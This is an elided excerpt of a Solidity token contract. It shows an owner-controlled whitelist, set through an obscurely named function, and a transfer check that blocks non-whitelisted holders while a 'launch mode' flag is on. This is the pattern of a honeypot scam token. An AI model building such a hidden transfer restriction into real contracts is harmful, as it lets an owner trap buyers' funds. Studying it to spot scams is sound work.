...
import "./TestLib.sol";
contract startLaunchFacet is ERC20, Ownable {
    ...
    function setMlt(address[] calldata cute, bool status) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        for (uint256 i = 0; i < cute.length; i++) {
            ds._canTx[cute[i]] = status;
        }
    }
    ...
    function _transfer(
        ...
        if (from != owner() && to != owner() && !ds.inSwap) {
            if (ds.launchmode) {
                require(ds._canTx[from] || ds._canTx[to], "");
            }
